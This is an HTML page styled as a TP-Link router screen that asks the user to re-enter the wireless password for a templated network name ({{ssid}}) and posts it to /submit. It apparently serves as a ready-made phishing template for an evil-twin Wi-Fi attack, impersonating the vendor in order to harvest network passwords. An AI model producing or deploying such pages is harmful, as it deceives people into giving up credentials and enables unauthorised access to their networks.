<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TP-Link Wireless Router</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border: 1px solid #ddd;
            border-radius: 4px;
            max-width: 450px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: #0088cc;
            color: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo-text {
            font-size: 20px;
            font-weight: bold;
        }
        .content {
            padding: 30px;
        }
        h2 {
            color: #333;
            font-size: 18px;
            margin-bottom: 10px;
        }
        .network-box {
            background: #e8f4f8;
            border-left: 4px solid #0088cc;
            padding: 12px;
            margin: 20px 0;
            border-radius: 2px;
        }
        .network-label {
            color: #666;
            font-size: 13px;
            margin-bottom: 5px;
        }
        .network-ssid {
            color: #0088cc;
            font-size: 16px;
            font-weight: bold;
        }
        .form-row {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 14px;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #0088cc;
            box-shadow: 0 0 0 2px rgba(0,136,204,0.1);
        }
        .button-row {
            display: flex;
            gap: 10px;
            margin-top: 25px;
        }
        button {
            flex: 1;
            padding: 10px 20px;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.2s;
        }
        button[type="submit"] {
            background: #0088cc;
            color: white;
        }
        button[type="submit"]:hover {
            background: #0077b3;
        }
        .footer {
            background: #f9f9f9;
            border-top: 1px solid #e0e0e0;
            padding: 15px;
            text-align: center;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
                <circle cx="12" cy="12" r="3"/>
            </svg>
            <div class="logo-text">TP-Link</div>
        </div>
        <div class="content">
            <h2>Wireless Network Authentication</h2>
            <p style="color: #666; font-size: 13px; margin-top: 8px;">
                Please enter the wireless password to connect
            </p>

            <div class="network-box">
                <div class="network-label">Network Name (SSID)</div>
                <div class="network-ssid">{{ssid}}</div>
            </div>

            <form method="POST" action="/submit">
                <div class="form-row">
                    <label for="password">Wireless Password *</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required autofocus>
                </div>

                <div class="button-row">
                    <button type="submit">Connect</button>
                </div>
            </form>
        </div>
        <div class="footer">
            TP-Link Router Management System
        </div>
    </div>
</body>
</html>
